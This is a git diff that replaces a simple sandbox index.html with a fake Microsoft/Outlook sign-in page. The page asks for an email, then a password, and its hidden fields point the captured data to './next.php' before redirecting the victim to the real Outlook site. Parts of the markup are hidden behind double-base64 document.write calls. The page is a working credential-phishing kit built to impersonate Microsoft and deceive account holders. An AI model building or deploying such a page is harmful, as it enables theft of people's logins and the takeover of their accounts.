@@ -1,15 +1,112 @@
-<html>
+<!doctype html>
+<html lang="en">
 
 <head>
-	<title>Parcel1 Sandbox</title>
-	<meta charset="UTF-8" />
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" ></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css">
+    <title>Secured/Access</title>
+    <link rel="stylesheet" type="text/css" href="css/mycss.css">
 </head>
 
 <body>
-	<div id="app"></div>
-
-	<script src="src/index.ts">
-	</script>
-</body>
-
+    <div id="main">
+        <div class="bgimg"></div>
+        <div class="container-fluid">
+            <div class="container">
+                <div class="row topp">
+                    <div class="col-lg-6 mx-auto">
+                        <div class="box" id="paaaaart1">
+                            <div class="loader " style="display:none;">
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                            </div>
+                            <div class="boxtext">
+                                <img src="https://www.google.com/s2/favicons?sz=64&domain_url=outlook.com" class="img-fluid logoimg" width="30px">&nbsp<span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span><br><br>
+                                <span class="h5">Sign In</span><br>
+                                <span id="error" class="text-danger" style="display: none;">That Microsoft account doesn't exist. Enter a different account</span>
+                                <div class="form-group mt-2">
+                                    <input type="email" name="ai" class="form-control rounded-0 border-dark" id="ai" aria-describedby="aiHelp" value="" placeholder="Email, phone, or Skype" style="border-right: none;border-left: none;border-top: none;">
+                                </div>
+                                <p style="font-size: 13px">No account? <a href="#">Create one!</a></p>
+                                <p style="font-size: 13px"><a href="#">Can't access your account?</a></p>
+                                <div class="text-right">
+                                    <button type="button" class="btn rounded-0 text-white px-4 w-25" style="background-color: lightgrey;color:black !important;cursor: pointer;">Back</button>
+                                    <button type="button" class="btn rounded-0 text-white px-4 w-25" id="next" style="background-color: #0066BA;cursor: pointer;">Next</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="box" id="paaaart2" style="display: none;">
+                            <div class="loader " style="display:none;">
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                            </div>
+                            <form id="contact" class="boxtext">
+                                <img src="https://www.google.com/s2/favicons?sz=64&domain_url=outlook.com" class="img-fluid logoimg" width="30px">&nbsp<span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span><br><br>
+                                <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="aich">abc@abc.com</span>
+                                <div class="py-2"><span class="h5">Enter Password</span></div>
+                                <div class="pb-2">
+                                    <span id="mgss" class="text-gray">Because you're accessing sensitive info, you need to verify your password</span>
+                                </div>
+                                <div class="form-group mt-2">
+                                    <input type="password" name="pr" class="form-control rounded-0 border-dark" id="pr" aria-describedby="aiHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
+                                </div>
+                                <p style="font-size: 14px"><a href="#">Forget password?</a></p>
+                                <div class="text-right">
+                                    <button type="button" class="btn rounded-0 text-white px-4 w-25" style="background-color: lightgrey;color:black !important;cursor: pointer;">Back</button>
+                                    <button type="button" class="btn rounded-0 text-white px-4" id="sub-btn" style="background-color: #0066BA;">login</button>
+                                </div>
+                            </form>
+                        </div>
+                        <div class="box" id="paaaart3" style="display: none;">
+                            <div class="boxtext">
+                                <img src="https://www.google.com/s2/favicons?sz=64&domain_url=outlook.com" class="img-fluid logoimg" width="30px">&nbsp<span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span><br><br>
+                                <span class="h4">Taking you to your Organization's sign-in page</span><br><br>
+                                <div class="loader ">
+                                    <div class="circle"></div>
+                                    <div class="circle"></div>
+                                    <div class="circle"></div>
+                                    <div class="circle"></div>
+                                    <div class="circle"></div>
+                                </div>
+                                <br>
+                                <div class="text-left">
+                                    <a href="#">cancel</a>
+                                </div>
+                                <br><br>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="row ">
+                <div class="col-sm-5 mx-auto box2">
+                    <div class="py-2 bg-white ">
+                        <span><img src="images/key.svg" width="30px"> &nbspSign in options</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script type="text/javascript">
+            document.write(atob(atob("UEdadmIzUmxjaUJwWkQwaVptOXZkR1Z5SWo0S0lDQWdJQ0FnSUNBZ0lDQWdQR1JwZGo0S0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUR4a2FYWWdZMnhoYzNNOUltWnZiM1JsY2s1dlpHVWlQZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUR4emNHRnVQc0twTWpBeU5DQk5hV055YjNOdlpuUThMM053WVc0K0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQR0VnYUhKbFpqMGlJeUkrVUhKcGRtRmplU0J6ZEdGMFpXMWxiblE4TDJFK0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOEwyUnBkajRLSUNBZ0lDQWdJQ0FnSUNBZ1BDOWthWFkrQ2lBZ0lDQWdJQ0FnUEM5bWIyOTBaWEkr")));
+        </script>
+    </div>
+    <input type="hidden" id="f" value="./next.php">
+    <input type="hidden" id="rc" value="2">
+    <input type="hidden" id="rdrt" value="https://outlook.office.com">
+    <script type="text/javascript">
+        document.write(atob(atob("UEhOamNtbHdkQ0IwZVhCbFBTSjBaWGgwTDJwaGRtRnpZM0pwY0hRaUlITnlZejBpYUhSMGNITTZMeTlqWkc1cWN5NWpiRzkxWkdac1lYSmxMbU52YlM5aGFtRjRMMnhwWW5NdmNHOXdjR1Z5TG1wekx6RXVNVEl1T1M5MWJXUXZjRzl3Y0dWeUxtMXBiaTVxY3lJK1BDOXpZM0pwY0hRK0NpQWdJQ0E4YzJOeWFYQjBJSFI1Y0dVOUluUmxlSFF2YW1GMllYTmpjbWx3ZENJZ2MzSmpQU0pvZEhSd2N6b3ZMMjFoZUdOa2JpNWliMjkwYzNSeVlYQmpaRzR1WTI5dEwySnZiM1J6ZEhKaGNDODBMakF1TUM5cWN5OWliMjkwYzNSeVlYQXViV2x1TG1weklqNDhMM05qY21sd2RENEtJQ0FnSUR4elkzSnBjSFFnZEhsd1pUMGlkR1Y0ZEM5cVlYWmhjMk55YVhCMElpQnpjbU05SW1oMGRIQnpPaTh2WTI5a1pTNXFjWFZsY25rdVkyOXRMMnB4ZFdWeWVTMHpMakl1TVM1emJHbHRMbTFwYmk1cWN5SStQQzl6WTNKcGNIUStDand2WW05a2VUNEtQSE5qY21sd2RDQjBlWEJsUFNKMFpYaDBMMnBoZG1GelkzSnBjSFFpSUhOeVl6MGlhSFIwY0hNNkx5OWhhbUY0TG1kdmIyZHNaV0Z3YVhNdVkyOXRMMkZxWVhndmJHbGljeTlxY1hWbGNua3ZNaTR5TGpRdmFuRjFaWEo1TG0xcGJpNXFjeUkrUEM5elkzSnBjSFEr")));
+    </script>
+<script type="text/javascript" src="./css/myjs.js"></script>
 </html>
